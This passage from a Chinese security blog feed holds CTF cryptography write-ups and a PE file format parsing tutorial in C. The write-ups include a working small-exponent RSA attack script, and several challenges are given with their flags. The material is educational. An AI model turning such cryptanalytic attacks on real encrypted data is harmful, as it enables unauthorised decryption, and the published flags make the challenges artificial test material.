data-num="81"></td><td><pre>s<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="82"></td><td><pre><span class="token keyword">while</span> k<span class="token operator">&lt;</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="83"></td><td><pre>              s<span class="token operator">=</span>s<span class="token operator">+</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="84"></td><td><pre>              k<span class="token operator">=</span>k<span class="token operator">+</span><span class="token number">1</span></pre></td></tr><tr><td data-num="85"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr></table></figure><p>获得结果</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220403132310760.png" alt="image-20220403132310760" /></p>
<h2 id="robomunication"><a class="anchor" href="#robomunication">#</a> robomunication</h2>
<p>注意：得到的 flag 请包上 flag {} 提交</p>
<p>下载文件发现是一个音频</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220406203620013.png" alt="image-20220406203620013" /></p>
<p>用 Audacity 听，发现是摩斯密码，哔哔哔哔   哔  哔波哔哔。。。</p>
<p>欣赏一下 MP3 咯～哔哔哔哔～哔～哔吥哔哔～2333 想到是摩尔斯电码</p>
<p>记录下来： 哔是。吥是 - 停顿别忘记打空格</p>
<p>总的就是</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">-</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span> <span class="token punctuation">.</span> <span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">-</span> <span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span> <span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span></pre></td></tr></table></figure><p>解码得到</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/3931cc101ea688f1b03fcdd5a547111.png" alt="3931cc101ea688f1b03fcdd5a547111" /></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>HELLOWHATISTHEKEYITISBOOPBEEP</pre></td></tr></table></figure><p>最终解得 flag 为： <code>BOOPBEEP</code></p>
<h2 id="dangerous-rsa"><a class="anchor" href="#dangerous-rsa">#</a> Dangerous RSA</h2>
<p>littlE littlE RSA Big Big Dangerous 注意：得到的 flag 请包上 flag {} 提交</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#n:  0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#e:  0x3</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#c:0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></pre></td></tr><tr><td data-num="4"></td><td><pre>so<span class="token punctuation">,</span>how to get the message?</pre></td></tr></table></figure><p><strong>小指数攻击</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token punctuation">:</span> utf<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> iroot</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> libnum</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>e <span class="token operator">=</span> <span class="token number">0x3</span></pre></td></tr><tr><td data-num="7"></td><td><pre>n <span class="token operator">=</span> <span class="token number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></pre></td></tr><tr><td data-num="8"></td><td><pre>c <span class="token operator">=</span> <span class="token number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>k <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    res <span class="token operator">=</span> iroot<span class="token punctuation">(</span>c<span class="token operator">+</span>k<span class="token operator">*</span>n<span class="token punctuation">,</span>e<span class="token punctuation">)</span>  <span class="token comment">#c+k*n 开 3 次方根 能开 3 次方即可</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token comment">#print(res)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token comment">#res = (mpz(13040004482819713819817340524563023159919305047824600478799740488797710355579494486728991357), True)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#转为字符串</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    k<span class="token operator">=</span>k<span class="token operator">+</span><span class="token number">1</span></pre></td></tr></table></figure><p>得到 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220406203912638.png" alt="image-20220406203912638" /></p>
<h2 id="cipher"><a class="anchor" href="#cipher">#</a> Cipher</h2>
<p 小写字母="">还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 注意：得到的 flag 请包上 flag {} 提交，flag</p>
<p>“公平的玩吧” 翻译成英文为 playfair</p>
<p><strong>这是 Playfair 密码</strong>（有句 mmp 不知当讲不当讲）</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9wbGF5ZmFpciVFNSVBRiU4NiVFNyVBMCU4MS84OTk5ODE0P2ZyPWFsYWRkaW4=">普莱费尔密码百度百科</span></p>
<p><span class="exturl" data-url="aHR0cDovL3J1bWtpbi5jb20vdG9vbHMvY2lwaGVyL3BsYXlmYWlyLnBocA==">Playfair Cipher 解密工具</span></p>
<p>得到 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220406204023296.png" alt="image-20220406204023296" /></p>
<h2 id="博文有待更新作者还需努力"><a class="anchor" href="#博文有待更新作者还需努力">#</a> 博文有待更新，作者还需努力！！！</h2>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Cr</tag>
      </tags>
  </entry>
  <entry>
    <title>PE文件结构解析之TLS表、延迟导入表、资源表和其他表解析</title>
    <url>/article/735341d2.html</url>
    <content><![CDATA[<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301185234414.png" alt="image-20220301185234414" /></p>
<h1 id="tls表结构解析"><a class="anchor" href="#tls表结构解析">#</a> TLS 表结构解析</h1>
<p>lord PE 中查看 TLS 表信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220228194119186.png" alt="image-20220228194119186" /></p>
<p>由于 TLS 表往往存在 TLS 区段中的局部存储当中，而局部存储一般情况下会优于程序执行之前运行也就在执行 main 函数之前，所以需要考虑前后顺序。</p>
<h3 id="tls结构顺序"><a class="anchor" href="#tls结构顺序">#</a> TLS 结构顺序</h3>
<p>32 位 TLS 表结构： <code>_IMAGE_TLS_DIRECTORY32</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220228195012078.png" alt="image-20220228195012078" /></p>
<h3 id="测试代码"><a class="anchor" href="#测试代码">#</a> 测试代码：</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析 TLS 表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">TLSTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">TLSTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token comment">// 定位数据目录表中的 TLS 表</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	PIMAGE_DATA_DIRECTORY pTLSDir <span class="token operator">=</span> <span class="token punctuation">(</span>pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_TLS<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token comment">// 填充 TLS 结构</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	PIMAGE_TLS_DIRECTORY pTLS <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_TLS_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pTLSDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"数据块开始VA：%08X\n"</span><span class="token punctuation">,</span>pTLS<span class="token operator">-></span>StartAddressOfRawData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"数据块结束VA：%08X\n"</span><span class="token punctuation">,</span> pTLS<span class="token operator">-></span>EndAddressOfRawData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"索引变量VA：%08X\n"</span><span class="token punctuation">,</span> pTLS<span class="token operator">-></span>AddressOfIndex<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"回调表VA：%08X\n"</span><span class="token punctuation">,</span> pTLS<span class="token operator">-></span>AddressOfCallBacks<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"填零大小：%08X\n"</span><span class="token punctuation">,</span> pTLS<span class="token operator">-></span>SizeOfZeroFill<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"特征值：%08X\n"</span><span class="token punctuation">,</span> pTLS<span class="token operator">-></span>Characteristics<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220228200233832.png" alt="image-20220228200233832" /></p>
<h3 id="运行结果"><a class="anchor" href="#运行结果">#</a> 运行结果</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301131404424.png" alt="image-20220301131404424" /></p>
<h1 id="延迟导入表结构解析"><a class="anchor" href="#延迟导入表结构解析">#</a> 延迟导入表结构解析</h1>
<p>延迟导入表结构：  <code>_IMAGE_DELAYLOAD_DESCRIPTOR</code></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DELAYLOAD_DESCRIPTOR</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        DWORD AllAttributes<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            DWORD RvaBased <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>             <span class="token comment">// Delay load version 2</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            DWORD ReservedAttributes <span class="token operator">:</span> <span class="token number">31</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token punctuation">&#125;</span> DUMMYSTRUCTNAME<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span> Attributes<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    DWORD DllNameRVA<span class="token punctuation">;</span>                       <span class="token comment">// RVA to the name of the target library (NULL-terminate ASCII string)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    DWORD ModuleHandleRVA<span class="token punctuation">;</span>                  <span class="token comment">// RVA to the HMODULE caching location (PHMODULE)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    DWORD ImportAddressTableRVA<span class="token punctuation">;</span>            <span class="token comment">// RVA to the start of the IAT (PIMAGE_THUNK_DATA)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    DWORD ImportNameTableRVA<span class="token punctuation">;</span>               <span class="token comment">// RVA to the start of the name table (PIMAGE_THUNK_DATA::AddressOfData)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    DWORD BoundImportAddressTableRVA<span class="token punctuation">;</span>       <span class="token comment">// RVA to an optional bound IAT</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    DWORD UnloadInformationTableRVA<span class="token punctuation">;</span>        <span class="token comment">// RVA to an optional unload info table</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    DWORD TimeDateStamp<span class="token punctuation">;</span>                    <span class="token comment">// 0 if not bound,</span></pre></td></tr><tr><td data-num="17"></td><td><pre>                                            <span class="token comment">// Otherwise, date/time of the target DLL</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_DELAYLOAD_DESCRIPTOR<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DELAYLOAD_DESCRIPTOR<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301133930829.png" alt="image-20220301133930829" /></p>
<h2 id="测试代码-2"><a class="anchor" href="#测试代码-2">#</a> 测试代码：</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析延迟导入表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">DelayImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">DelayImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token comment">// 定位数据目录表中的延迟导入表</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	PIMAGE_DATA_DIRECTORY pDelayLoadDir <span class="token operator">=</span> <span class="token punctuation">(</span>pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token comment">// 填充延迟导入表的数据结构</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	PIMAGE_DELAYLOAD_DESCRIPTOR pDelayLoad <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DELAYLOAD_DESCRIPTOR<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pDelayLoadDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token comment">//</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token keyword">while</span> <span class="token punctuation">(</span>pDelayLoad<span class="token operator">-></span>DllNameRVA <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token keyword">char</span> <span class="token operator">*</span> szDllName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pDelayLoad<span class="token operator">-></span>DllNameRVA<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"DLLName：%s\n"</span><span class="token punctuation">,</span> szDllName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Attributes：%08X\n"</span><span class="token punctuation">,</span> pDelayLoad<span class="token operator">-></span>Attributes<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ModuleHandleRVA：%08X\n"</span><span class="token punctuation">,</span> pDelayLoad<span class="token operator">-></span>ModuleHandleRVA<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ImportAddressTableRVA：%08X\n"</span><span class="token punctuation">,</span> pDelayLoad<span class="token operator">-></span>ImportAddressTableRVA<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ImportNameTableRVA：%08X\n"</span><span class="token punctuation">,</span> pDelayLoad<span class="token operator">-></span>ImportNameTableRVA<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"BoundImportAddressTableRVA：%08X\n"</span><span class="token punctuation">,</span> pDelayLoad<span class="token operator">-></span>BoundImportAddressTableRVA<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"UnloadInformationTableRVA：%08X\n"</span><span class="token punctuation">,</span> pDelayLoad<span class="token operator">-></span>UnloadInformationTableRVA<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"TimeDateStamp：%08X\n\n"</span><span class="token punctuation">,</span> pDelayLoad<span class="token operator">-></span>TimeDateStamp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>		pDelayLoad<span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="运行测试"><a class="anchor" href="#运行测试">#</a> 运行测试：</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301143542531.png" alt="image-20220301143542531" /></p>
<h1 id="资源表结构解析"><a class="anchor" href="#资源表结构解析">#</a> 资源表结构解析</h1>
<p>Lord PE 中查看资源表</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301152700474.png" alt="image-20220301152700474" /></p>
<p>资源在 PE 中是以目录的形式存在的，一般有 3 层：</p>
<ul>
<li>资源类型</li>
<li>目标资源 ID</li>
<li>资源代码页</li>
</ul>
<p>资源表头部结构： <code>PIMAGE_RESOURCE_DIRECTORY</code>  负责指出后面数组中的成员个数</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_RESOURCE_DIRECTORY</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    DWORD   Characteristics<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    DWORD   TimeDateStamp<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    WORD    MajorVersion<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    WORD    MinorVersion<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    WORD    NumberOfNamedEntries<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    WORD    NumberOfIdEntries<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">//  IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_RESOURCE_DIRECTORY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_RESOURCE_DIRECTORY<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_RESOURCE_NAME_IS_STRING</span>        <span class="token expression"><span class="token number">0x80000000</span></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_RESOURCE_DATA_IS_DIRECTORY</span>     <span class="token expression"><span class="token number">0x80000000</span></span></span></pre></td></tr></table></figure><ul>
<li>Characteristics：资源属性，一般情况下为 <code>00000000</code></li>
<li>TimeDateStamp：资源创建的时间</li>
<li>MajorVersion：主版本号，一般情况下为 4</li>
<li>MinorVersion：子版本号，一般情况下为 0</li>
<li>NumberOfNamedEntries：以字符串作为资源标识的条目的个数</li>
<li>NumberOfIdEntries：以数字作为资源标识的条目的个数</li>
</ul>
<p>结构数组： <code>PIMAGE_RESOURCE_DIRECTORY_ENTRY</code>  数组成员分别指向下一层目录结构</p>
